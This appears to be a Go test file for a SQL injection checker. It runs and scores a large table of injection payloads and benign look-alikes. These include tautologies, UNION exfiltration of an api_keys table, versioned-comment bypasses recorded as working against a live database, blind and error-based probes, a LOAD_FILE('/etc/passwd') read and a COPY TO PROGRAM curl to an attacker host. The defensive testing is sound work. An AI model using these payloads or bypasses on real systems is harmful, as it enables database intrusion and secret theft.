package security

// TestAdvancedSuite is a systematic, table-driven battery of advanced SQL
// injection techniques run against the CURRENT security checker, built in
// response to a reviewer asking us to demonstrate resistance to
// parameterized-query misuse, nested expressions, stored procedures, encoding
// variations, comment obfuscation and other advanced injection techniques.
//
// The suite never fails on a miss: a missed attack or a benign false positive
// is data to be reported, not a test regression. It fails only if analysing a
// payload panics. When ADVANCED_JSON=<path> is set it writes a machine-readable
// report with the per-case decision and per-category/overall rates.
//
// "Detected" for an attack means the engine BLOCKED it (hard stop). Flags are
// recorded separately: an unbounded scan of a restricted table is flagged by
// design, not blocked, and that distinction is preserved in the report.

import (
	"encoding/json"
	"os"
	"strings"
	"testing"

	"github.com/Dheeran-git/UniDBGo/parser"
)

// label is the ground-truth classification of a payload.
type label string

const (
	attack label = "attack"
	benign label = "benign"
)

type advCase struct {
	Category string
	Dialect  parser.Dialect
	Query    string
	Expect   label
	Note     string
}

// verdicts maps a payload to the manual verification outcome recorded after
// the first run and live-database checks. A payload absent from the map that
// was correctly handled needs no verdict. Values:
//
//	"detected"     attack blocked (or benign correctly allowed) by the checker
//	"bypass"       genuine miss that works against the live database (verified)
//	"out-of-scope" miss that is out of the checker's design scope by intent
//	"invalid-sql"  miss that is not valid SQL on the target, so not exploitable
//	"flagged"      attack flagged (not blocked) by design (unbounded scan)
//	"false-positive-benign" benign look-alike that the checker blocked
var verdicts = map[string]string{
	// --- genuine bypasses: checker passes them as benign, live DB is exploited ---
	`SELECT * FROM accounts WHERE id = 1 /*!80041 OR 1=1 */`:                                  "bypass", // live: 2 rows (both accounts)
	`SELECT * FROM accounts WHERE id = 1 /*!80045 OR 1=1 */`:                                  "bypass", // live: 2 rows
	`SELECT * FROM accounts WHERE id = 1 /*!80046 OR 1=1 */`:                                  "bypass", // live: 2 rows
	`SELECT * FROM accounts WHERE id = 1 /*!80041 UNION SELECT id,secret,id FROM api_keys */`: "bypass", // live: leaks SECRET-aaa-111, SECRET-bbb-222
	`SELECT * FROM accounts WHERE id = 1 OR (SELECT 1)=1`:                                     "bypass", // live: 2 rows
	`SELECT * FROM accounts WHERE id = ? OR (SELECT 1)=1`:                                     "bypass", // live (?=1): 2 rows
	`SELECT * FROM accounts WHERE id = 1 OR EXISTS(SELECT 1)`:                                 "bypass", // live: 2 rows
	`SELECT * FROM accounts WHERE id = 1 OR UNHEX('41')='A'`:                                  "bypass", // live: 2 rows
	`SELECT * FROM accounts WHERE id = 1 OR CHR(65)||CHR(66)='AB'`:                            "bypass", // pg live: 2 rows (|| is concat in pg)

	// --- misses that are NOT exploitable as written on the live target ---
	`SELECT * FROM accounts WHERE id = 1 /*!80042 OR 1=1 -- */`:                               "invalid-sql", // live: ERROR 1064, the "-- " eats the closing */
	`SELECT name FROM accounts WHERE id = 1 /*!80045 UNION SELECT secret,id FROM api_keys */`: "invalid-sql", // live: ERROR 1222, column count mismatch
	`SELECT * FROM accounts WHERE id = 1 /*!99999 OR 1=1 */`:                                  "invalid-sql", // live: 1 row, 99999 > server 80046 so inert on MySQL too
	`CALL get_account(1) /*!80045 ; DROP TABLE api_keys */`:                                   "invalid-sql", // live: ERROR 1064, ; stacking needs CLIENT_MULTI_STATEMENTS

	// --- out of scope by design (server-side body / no visible malicious structure) ---
	`PREPARE s FROM 'SELECT * FROM accounts WHERE id = 1 OR 1=1'`: "out-of-scope", // PrepareStmt not modeled; dynamic SQL assembled server-side
	`EXECUTE s`:                "out-of-scope", // ExecuteStmt not modeled
	`EXECUTE s USING @a`:       "out-of-scope",
	`DO SLEEP(5)`:              "out-of-scope", // Vitess parses DO to OtherAdmin, discarding the expr; live DO SLEEP(1) measured 1.009s
	`DO (SELECT 1 OR 1=1)`:     "out-of-scope",
	`SELECT lookup_account(1)`: "out-of-scope", // UDF body runs server-side, invisible to AST rules
	`CALL get_account((SELECT secret FROM api_keys LIMIT 1))`:               "out-of-scope", // CallProc body server-side
	`CALL mysql.proc_analyse()`:                                             "out-of-scope",
	`SELECT * FROM accounts WHERE name = 'admin'-- `:                        "out-of-scope", // comment ends input; nothing continues as SQL (benign structure)
	`SELECT * FROM accounts WHERE name = 'admin'#`:                          "out-of-scope",
	`SELECT * FROM accounts ORDER BY (SELECT secret FROM api_keys LIMIT 1)`: "out-of-scope", // restricted read used only as a sort key, not projected

	// --- flagged (not blocked) by design: restricted-table / catalog read ---
	`SELECT * FROM accounts WHERE id IN (SELECT id FROM api_keys)`: "flagged", // unbounded-scan flag on the api_keys sub-query
	`SELECT table_name FROM information_schema.tables`:             "flagged", // system-catalog flag
	`SELECT * FROM pg_catalog.pg_tables`:                           "flagged",
	`SELECT * FROM pg_user`:                                        "flagged",
	`SELECT secret FROM api_keys INTO OUTFILE '/tmp/x'`:            "flagged", // unbounded-scan flag; OUTFILE mechanism itself not modeled
}

// nestParens wraps expr in n levels of parentheses.
func nestParens(expr string, n int) string {
	return strings.Repeat("(", n) + expr + strings.Repeat(")", n)
}

func advancedCases() []advCase {
	deep := `SELECT * FROM accounts WHERE id = 1 OR ` + nestParens("1=1", 50)
	var cs []advCase
	add := func(cat string, d parser.Dialect, q string, e label, note string) {
		cs = append(cs, advCase{cat, d, q, e, note})
	}

	// ============================================================
	// 1. parameterized-query misuse
	// ============================================================
	const pqm = "parameterized-query-misuse"
	// Attacks: a placeholder is present but attacker input was still
	// concatenated into another part of the statement.
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND role = '' OR '1'='1'`, attack, "placeholder for id, tautology concatenated into role")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name = '' OR 1=1 -- '`, attack, "placeholder + trailing-comment tautology")
	add(pqm, parser.Postgres, `SELECT * FROM accounts WHERE id = $1 AND name = '' OR 1=1 -- '`, attack, "pg placeholder + tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? ORDER BY name; DROP TABLE api_keys`, attack, "ORDER BY tail used to stack a statement")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? LIMIT 1 UNION SELECT id, secret, id FROM api_keys`, attack, "LIMIT concatenation opens a UNION")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id IN (1,2) OR 1=1`, attack, "IN-list concatenation + tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE name LIKE '%' OR 1=1 -- %'`, attack, "LIKE pattern concatenation + tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE accounts.name = 'x' OR 1=1`, attack, "identifier-qualified column, tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? OR (SELECT 1)=1`, attack, "placeholder + constant sub-select tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name = '' UNION SELECT id, secret, id FROM api_keys -- '`, attack, "placeholder + UNION exfiltration")
	add(pqm, parser.Postgres, `SELECT * FROM accounts WHERE id = $1 UNION SELECT id, secret FROM api_keys`, attack, "pg placeholder + UNION exfiltration")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND email = '' OR 'a'='a' -- '`, attack, "tautology on email column")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name = '' OR 2 BETWEEN 1 AND 3 -- '`, attack, "BETWEEN tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name IN ('a') OR 1 IN (1) -- '`, attack, "IN tautology")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name = '' OR id = id -- '`, attack, "column-equals-itself tautology")
	// ORDER BY / LIMIT value tampering where the structure stays valid (no
	// tautology, no stacking): the checker is not an authorization layer and
	// does not block these.
	add(pqm, parser.MySQL, `SELECT * FROM accounts ORDER BY (SELECT secret FROM api_keys LIMIT 1)`, attack, "ORDER BY sub-query over restricted table")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id IN (SELECT id FROM api_keys)`, attack, "IN sub-query reading restricted table (no tautology)")
	// Benign look-alikes.
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? AND name = ?`, benign, "fully parameterized")
	add(pqm, parser.Postgres, `SELECT * FROM accounts WHERE id = $1 AND status = $2`, benign, "fully parameterized (pg)")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id IN (1,2,3,4,5)`, benign, "legitimate IN-list")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE name LIKE '%ali%'`, benign, "legitimate LIKE search")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE id = ? ORDER BY name LIMIT 10`, benign, "legitimate ORDER BY / LIMIT")
	add(pqm, parser.MySQL, `SELECT * FROM accounts WHERE status = 'a' OR status = 'b'`, benign, "legitimate OR of two column predicates")

	// ============================================================
	// 2. nested expressions
	// ============================================================
	const nest = "nested-expressions"
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR (1=1)`, attack, "parenthesised tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR NOT NOT 1=1`, attack, "double negation")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR CASE WHEN 1=1 THEN 1 ELSE 0 END`, attack, "CASE tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR IF(1=1,1,0)`, attack, "IF tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR COALESCE(NULL,1)`, attack, "COALESCE tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR NULLIF(1,2)=1`, attack, "NULLIF tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 2-1=1`, attack, "arithmetic tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR CONCAT('a','b')='ab'`, attack, "string-function tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 2 BETWEEN 1 AND 3`, attack, "BETWEEN tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 1 IN (1,2,3)`, attack, "IN tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 'abc' LIKE '%'`, attack, "LIKE %% tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 1 XOR 0`, attack, "XOR tautology")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR (SELECT 1)=1`, attack, "scalar sub-select constant")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR EXISTS(SELECT 1)`, attack, "EXISTS constant sub-select")
	add(nest, parser.MySQL, deep, attack, "50 levels of nested parentheses around 1=1")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR CASE WHEN COALESCE(NULL, (2-1)) = 1 THEN 1 ELSE 0 END`, attack, "deeply nested CASE/COALESCE/arithmetic")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR IFNULL(NULL, 5) > 2`, attack, "IFNULL tautology")
	add(nest, parser.Postgres, `SELECT * FROM accounts WHERE id = 1 OR (((1=1)))`, attack, "pg parenthesised tautology")
	// Benign look-alikes: nested expressions that are NOT constant-true.
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE (id = 1 OR id = 2) AND name = 'alice'`, benign, "parenthesised real predicates")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE CASE WHEN email IS NULL THEN 0 ELSE 1 END = 1`, benign, "CASE over a real column")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id = COALESCE(?, 1)`, benign, "COALESCE with placeholder")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id IN (1,2,3)`, benign, "real IN-list")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE id BETWEEN 1 AND 100`, benign, "real BETWEEN on column")
	add(nest, parser.MySQL, `SELECT * FROM accounts WHERE name LIKE CONCAT(?, '%')`, benign, "CONCAT with placeholder for prefix search")

	// ============================================================
	// 3. stored procedures
	// ============================================================
	const proc = "stored-procedures"
	add(proc, parser.MySQL, `CALL get_account('x' OR 1=1)`, attack, "tautology passed as a CALL argument (executes in body server-side)")
	add(proc, parser.MySQL, `CALL get_account(1); CALL get_account(2)`, attack, "stacked CALL")
	add(proc, parser.MySQL, `CALL get_account(1) /*!80045 ; DROP TABLE api_keys */`, attack, "versioned-comment stacked statement after CALL")
	add(proc, parser.MySQL, `PREPARE s FROM 'SELECT * FROM accounts WHERE id = 1 OR 1=1'`, attack, "PREPARE builds dynamic SQL from a string literal")
	add(proc, parser.MySQL, `PREPARE s FROM CONCAT('SELECT * FROM accounts WHERE id=', @x)`, attack, "PREPARE from a concatenated expression")
	add(proc, parser.MySQL, `EXECUTE s`, attack, "EXECUTE of a previously prepared statement")
	add(proc, parser.MySQL, `EXECUTE s USING @a`, attack, "EXECUTE ... USING")
	add(proc, parser.MySQL, `DO SLEEP(5)`, attack, "DO statement invoking a timing function")
	add(proc, parser.MySQL, `DO (SELECT 1 OR 1=1)`, attack, "DO with a tautology")
	add(proc, parser.MySQL, `SELECT lookup_account(1)`, attack, "SELECT invoking a user-defined function")
	add(proc, parser.MySQL, `CALL get_account((SELECT secret FROM api_keys LIMIT 1))`, attack, "CALL argument reads a restricted table")
	add(proc, parser.MySQL, `CALL mysql.proc_analyse()`, attack, "CALL into the mysql schema")
	add(proc, parser.Postgres, `CALL refresh('x'); DROP TABLE api_keys`, attack, "pg stacked statement after CALL")
	add(proc, parser.Postgres, `SELECT dblink_exec('...', 'DROP TABLE api_keys')`, attack, "dblink_exec runs SQL on a remote server")
	add(proc, parser.MySQL, `CALL get_account('x'); SELECT * FROM api_keys`, attack, "CALL then a direct restricted-table read")
	// Benign look-alikes.
	add(proc, parser.MySQL, `CALL get_account(?)`, benign, "parameterized CALL")
	add(proc, parser.MySQL, `CALL refresh_stats()`, benign, "no-argument CALL")
	add(proc, parser.MySQL, `SELECT lookup_account(?)`, benign, "parameterized function call")
	add(proc, parser.MySQL, `CALL get_account(42)`, benign, "constant integer argument")
	add(proc, parser.Postgres, `CALL refresh($1)`, benign, "pg parameterized CALL")

	// ============================================================
	// 4. encoding variations
	// ============================================================
	const enc = "encoding-variations"
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 0x41=0x41`, attack, "0x hex literal tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR X'41'=X'41'`, attack, "X'' hex literal tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 0b1000001=0b1000001`, attack, "binary literal tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR CHAR(65)='A'`, attack, "CHAR() tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR CONCAT('A','B')=0x4142`, attack, "CONCAT pieces vs hex tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR UNHEX('41')='A'`, attack, "UNHEX tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE name = _utf8'x' OR 1=1`, attack, "_utf8 introducer + tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE name = N'x' OR 1=1`, attack, "N'' introducer + tautology")
	add(enc, parser.MySQL, `SELECT name FROM accounts WHERE id = 1 UNION SELECT UNHEX(secret) FROM api_keys`, attack, "UNHEX wrapper around UNION exfiltration")
	add(enc, parser.Postgres, `SELECT * FROM accounts WHERE name = E'x\'' OR 1=1 -- '`, attack, "pg E'' string + tautology")
	add(enc, parser.Postgres, `SELECT * FROM accounts WHERE name = $$x$$ OR 1=1`, attack, "pg dollar-quoted string + tautology")
	add(enc, parser.Postgres, `SELECT * FROM accounts WHERE id = 1 OR CHR(65)='A'`, attack, "pg CHR() tautology")
	add(enc, parser.Postgres, `SELECT * FROM accounts WHERE id = 1 OR CHR(65)||CHR(66)='AB'`, attack, "pg CHR() concatenation tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 0x31 OR 1=1`, attack, "hex-encoded value + tautology")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 0x4f52=0x4f52`, attack, "hex of 'OR' as data + tautology")
	add(enc, parser.MySQL, `SELECT name FROM accounts WHERE id = 1 UNION SELECT CONCAT(id, secret) FROM api_keys`, attack, "CONCAT wrapper around UNION exfiltration")
	// Benign / inert look-alikes.
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE token = 0xDEADBEEF`, benign, "legitimate hex column value")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE name = CHAR(65,66,67)`, benign, "CHAR() used as a legitimate value")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE comment = 'where name = ʼ or 1=1'`, benign, "unicode homoglyph quote inside a string literal (inert text)")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE note = '%27%20OR%201%3D1'`, benign, "URL-encoded payload left encoded (inert text)")
	add(enc, parser.Postgres, `SELECT * FROM accounts WHERE name = $$it's fine$$`, benign, "dollar-quoted legitimate string")
	add(enc, parser.MySQL, `SELECT * FROM accounts WHERE name = _utf8'alice'`, benign, "introducer on a legitimate value")

	// ============================================================
	// 5. comment obfuscation
	// ============================================================
	const com = "comment-obfuscation"
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id=1/**/OR/**/2-1=1`, attack, "/**/ between tokens, tautology")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id=1/*!50000 OR*/ 1=1`, attack, "versioned comment <= server, OR executes")
	add(com, parser.MySQL, `SELECT name FROM accounts WHERE id=1 /*!50000 UNION*/ SELECT secret,id FROM api_keys`, attack, "versioned UNION keyword")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!80041 OR 1=1 */`, attack, "versioned comment 80041 > parser 80040, < server 80046")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!80042 OR 1=1 -- */`, attack, "versioned comment 80042 range")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!80045 OR 1=1 */`, attack, "versioned comment 80045 range")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!80046 OR 1=1 */`, attack, "versioned comment 80046 == server")
	add(com, parser.MySQL, `SELECT name FROM accounts WHERE id = 1 /*!80045 UNION SELECT secret,id FROM api_keys */`, attack, "versioned UNION exfiltration 80045")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!99999 OR 1=1 */`, attack, "versioned comment 99999 > server (inert on live too)")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 OR 1=1 # trailing`, attack, "# comment after tautology")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE name = 'a' OR 1=1 -- trailing`, attack, "-- comment after tautology")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE name = 'admin'-- `, attack, "comment truncates password check")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE name = 'admin'#`, attack, "# truncation")
	add(com, parser.MySQL, `SELECT/*comment*/* FROM accounts WHERE id=1 OR 1=1`, attack, "comment between keyword and star, tautology")
	add(com, parser.Postgres, `SELECT * FROM accounts WHERE id=1 /* /* nested */ */ OR 1=1`, attack, "pg nested block comment + tautology")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /*!80041 UNION SELECT id,secret,id FROM api_keys */`, attack, "versioned UNION exfiltration 80041")
	// Benign look-alikes.
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 -- fetch the primary account`, benign, "prose line comment")
	add(com, parser.MySQL, `SELECT * FROM accounts /* reporting query */ WHERE id = 1`, benign, "prose block comment")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 # created 2024`, benign, "prose # comment")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE note = '/* not a comment */'`, benign, "comment-like text inside a string literal")
	add(com, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 /* TODO: from 2024 */`, benign, "prose block comment with SQL-ish words")

	// ============================================================
	// 6. other advanced
	// ============================================================
	const oth = "other-advanced"
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND SLEEP(5)`, attack, "time-based blind (SLEEP)")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND BENCHMARK(1000000,MD5('x'))`, attack, "time-based blind (BENCHMARK)")
	add(oth, parser.Postgres, `SELECT * FROM accounts WHERE id = 1 AND pg_sleep(5) IS NOT NULL`, attack, "time-based blind (pg_sleep)")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND GET_LOCK('x',10)`, attack, "lock-based timing (GET_LOCK)")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND SUBSTRING(@@version,1,1)='8'`, attack, "boolean-blind against @@version")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND LENGTH(DATABASE())>5`, attack, "boolean-blind against DATABASE()")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND ASCII(SUBSTRING((SELECT secret FROM api_keys LIMIT 1),1,1))>64`, attack, "boolean-blind extracting a restricted secret")
	add(oth, parser.MySQL, `SELECT table_name FROM information_schema.tables`, attack, "information_schema enumeration")
	add(oth, parser.Postgres, `SELECT * FROM pg_catalog.pg_tables`, attack, "pg_catalog enumeration")
	add(oth, parser.Postgres, `SELECT * FROM pg_user`, attack, "pg_user enumeration (resolves via pg_catalog)")
	add(oth, parser.MySQL, `SELECT name FROM accounts WHERE id=1 UNION SELECT user FROM mysql.user`, attack, "UNION read of mysql.user privilege table")
	add(oth, parser.MySQL, `SELECT LOAD_FILE('/etc/passwd')`, attack, "out-of-band file read (LOAD_FILE)")
	add(oth, parser.MySQL, `SELECT secret FROM api_keys INTO OUTFILE '/tmp/x'`, attack, "exfiltration via INTO OUTFILE")
	add(oth, parser.Postgres, `COPY api_keys TO PROGRAM 'curl http://evil/'`, attack, "out-of-band via COPY TO PROGRAM")
	add(oth, parser.MySQL, `SELECT EXTRACTVALUE(1, CONCAT(0x7e,(SELECT secret FROM api_keys LIMIT 1)))`, attack, "error-based (EXTRACTVALUE + sub-query)")
	add(oth, parser.MySQL, `SELECT UPDATEXML(1, CONCAT(0x7e,(SELECT database())),1)`, attack, "error-based (UPDATEXML + database())")
	add(oth, parser.MySQL, `SELECT GTID_SUBSET(CONCAT(0x7e,(SELECT secret FROM api_keys LIMIT 1)),1)`, attack, "error-based (GTID_SUBSET + sub-query)")
	add(oth, parser.Postgres, `SELECT CAST((SELECT secret FROM api_keys LIMIT 1) AS int)`, attack, "pg error-based cast of restricted data")
	// Benign / out-of-scope look-alikes.
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE id = 1 AND name = 'alice'`, benign, "ordinary boolean AND with a column predicate")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE created > '2024-01-01'`, benign, "range filter on a column")
	add(oth, parser.MySQL, `SELECT COUNT(*) FROM accounts`, benign, "aggregate, no injection")
	add(oth, parser.MySQL, `SELECT * FROM accounts WHERE owner = CURRENT_USER()`, benign, "metadata used to filter, not to probe")
	add(oth, parser.Postgres, `SELECT * FROM accounts WHERE email = current_user`, benign, "pg metadata used as a filter value")
	add(oth, parser.MySQL, `SELECT SUBSTRING(name,1,1) FROM accounts WHERE id = ?`, benign, "SUBSTRING projecting a column, parameterized filter")

	return cs
}

type caseResult struct {
	Category   string `json:"category"`
	Dialect    string `json:"dialect"`
	Query      string `json:"query"`
	Expect     string `json:"expect"`
	Block      bool   `json:"block"`
	Flag       bool   `json:"flag"`
	DecidedCat string `json:"decided_category"`
	Reason     string `json:"reason"`
	Note       string `json:"note"`
	Correct    bool   `json:"correct"` // attack->blocked, benign->not blocked
	Verdict    string `json:"verdict"` // manual verification outcome
}

type rate struct {
	AttacksTotal        int `json:"attacks_total"`
	AttacksBlocked      int `json:"attacks_blocked"`
	AttacksFlaggedOnly  int `json:"attacks_flagged_only"`
	AttacksMissed       int `json:"attacks_missed"`
	BenignTotal         int `json:"benign_total"`
	BenignFalsePositive int `json:"benign_false_positives"`
}

type report struct {
	MySQLServerVersionParser string           `json:"parser_mysql_version"`
	Cases                    []caseResult     `json:"cases"`
	ByCategoryDialect        map[string]*rate `json:"by_category_dialect"`
	ByCategory               map[string]*rate `json:"by_category"`
	Overall                  rate             `json:"overall"`
}

func TestAdvancedSuite(t *testing.T) {
	eng := &SecurityEngine{RestrictedTables: []string{"users", "api_keys"}}

	rep := report{
		MySQLServerVersionParser: "8.0.40 -> comment-version 80040",
		ByCategoryDialect:        map[string]*rate{},
		ByCategory:               map[string]*rate{},
	}

	analyze := func(q string, d parser.Dialect) (dec Decision, panicked bool) {
		defer func() {
			if r := recover(); r != nil {
				panicked = true
			}
		}()
		dec = eng.AnalyzeFor(q, d)
		return
	}

	for _, c := range advancedCases() {
		dec, panicked := analyze(c.Query, c.Dialect)
		if panicked {
			t.Fatalf("Analyze panicked on %q (%s)", c.Query, c.Category)
		}
		correct := false
		if c.Expect == attack {
			correct = dec.Block
		} else {
			correct = !dec.Block
		}
		cr := caseResult{
			Category:   c.Category,
			Dialect:    string(c.Dialect),
			Query:      c.Query,
			Expect:     string(c.Expect),
			Block:      dec.Block,
			Flag:       dec.Flag,
			DecidedCat: string(dec.Category),
			Reason:     dec.Reason,
			Note:       c.Note,
			Correct:    correct,
			Verdict:    verdicts[c.Query],
		}
		rep.Cases = append(rep.Cases, cr)

		keyCD := c.Category + "::" + string(c.Dialect)
		// Tally per category+dialect and per category.
		tally := func(m map[string]*rate, key string) {
			r := m[key]
			if r == nil {
				r = &rate{}
				m[key] = r
			}
			if c.Expect == attack {
				r.AttacksTotal++
				switch {
				case dec.Block:
					r.AttacksBlocked++
				case dec.Flag:
					r.AttacksFlaggedOnly++
					r.AttacksMissed++
				default:
					r.AttacksMissed++
				}
			} else {
				r.BenignTotal++
				if dec.Block {
					r.BenignFalsePositive++
				}
			}
		}
		tally(rep.ByCategoryDialect, keyCD)
		tally(rep.ByCategory, c.Category)
		// overall
		if c.Expect == attack {
			rep.Overall.AttacksTotal++
			switch {
			case dec.Block:
				rep.Overall.AttacksBlocked++
			case dec.Flag:
				rep.Overall.AttacksFlaggedOnly++
				rep.Overall.AttacksMissed++
			default:
				rep.Overall.AttacksMissed++
			}
		} else {
			rep.Overall.BenignTotal++
			if dec.Block {
				rep.Overall.BenignFalsePositive++
			}
		}
	}

	if path := os.Getenv("ADVANCED_JSON"); path != "" {
		buf, err := json.MarshalIndent(rep, "", "  ")
		if err != nil {
			t.Fatalf("marshal report: %v", err)
		}
		if err := os.WriteFile(path, buf, 0o644); err != nil {
			t.Fatalf("write report %s: %v", path, err)
		}
		t.Logf("wrote advanced report to %s (%d cases)", path, len(rep.Cases))
	}
}
